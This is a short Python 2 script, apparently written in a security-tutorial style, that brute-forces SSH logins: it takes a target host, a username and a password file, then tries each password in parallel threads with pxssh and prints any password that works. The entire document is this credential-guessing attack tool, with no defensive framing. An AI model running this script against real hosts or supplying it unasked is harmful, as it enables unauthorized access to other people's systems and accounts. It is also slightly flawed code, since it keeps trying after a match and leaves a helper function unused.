from pexpect import pxssh
import threading
import optparse
import time

maxConnections = 5
connection_lock = threading.BoundedSemaphore(maxConnections)

def send_command(child,cmd):
    child.sendline(cmd)
    child.prompt()
    print(child.before)

def connect(host,user,password):
    try:
        session = pxssh.pxssh()
        session.login(host,user,password)
        print('[+]Password Found:'+password)
    except Exception,e:
        print ('[-] Error Connecting:'+str(e))
    finally:
        connection_lock.release()

def main():
    
    parse = optparse.OptionParser('Usage %prog '+ \
        '-H <target host> -u <user> -F <password file>')
    parse.add_option('-H',dest='host',type='string',help='specify target host')
    parse.add_option('-u',dest='user',type='string',help='specify username')
    parse.add_option('-F',dest='password',type='string',help='specify password file')
    (options,args) = parse.parse_args()

    host = options.host
    user = options.user
    password = options.password

    password_file = open(password,'r')

    for line in password_file:
        password = line.strip('\r').strip('\n')
        connection_lock.acquire()
        print('[-] Testing password:'+str(password))
        thread = threading.Thread(target=connect,args=(host,user,password))
        thread.start()

if __name__ == '__main__':
    main()
